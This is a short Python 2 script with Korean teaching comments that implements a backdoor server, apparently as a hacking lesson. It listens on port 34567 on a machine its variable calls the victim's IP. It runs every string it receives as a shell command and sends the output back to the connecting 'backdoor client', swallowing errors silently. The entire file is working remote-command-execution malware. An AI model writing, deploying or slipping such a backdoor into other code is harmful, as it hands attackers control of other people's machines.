#-*- coding: utf-8 -*-
import subprocess
from socket import *

def main():
    victimIP="" # yourself IP(자신의 IP를 입력하되 localhost 를 입력하면 안된다.(정확한 인터페이스카드의 IP 입력))
    s=socket(AF_INET, SOCK_STREAM)
    s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1) #SOL_SOCKET : 소켓과 관련된 가장 일반적인 옵션을 설정, SO_REUSEADDR : 이미 사용된 주소를 재사용 
    s.bind((victimIP, 34567))
    s.listen(10)
    conn, addr=s.accept()
    while(1):
        try:
            data=conn.recv(1000)
            if(len(data)):
                if((data=="Quit") or (data=="quit") or (data=="Q") or (data=="q")): 
                    break;
                #subprocess.PIPE클래스 : 프로세스를 생성하고 명령어를 전달하고 실행 결과를 백도어 클라이언트로 전달해 주는 기능을 한다. 
                #PIPE는 운영체제에 존재하는 임시파일로 프로세스간에 데이터를 주고받을 수 있는 통로 역할을 한다. 
                proc=subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                stdout_value=proc.stdout.read()+proc.stderr.read() #파이프를통해 실행결과와 오류메세지를 전송
                conn.send(stdout_value+" ")
        except Exception, e:
            pass
    conn.close()    

if __name__=="__main__":
    main()